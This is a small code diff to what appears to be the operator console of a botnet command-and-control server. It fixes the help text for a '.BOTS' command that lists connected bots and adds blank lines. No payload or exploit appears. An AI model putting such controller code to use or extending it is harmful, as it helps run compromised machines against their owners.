@@ -118,7 +118,7 @@ def command_line(client):
                 send(client, '.HELP: Shows list of commands')
                 send(client, '.CLEAR: Clears the screen')
                 send(client, '.LOGOUT: Disconnects from server')
-                send(client, '.BOTS: Disconnects from server')
+                send(client, '.BOTS: Displays info of connected bots.')
                 send(client, '')
 
             elif command.upper() == '.CLEAR':
@@ -138,6 +138,8 @@ def command_line(client):
                         send(client, bot.recv(1024).decode())
                 else:
                     send(client, "This command takes no args.")
+
+
 
 
         except:
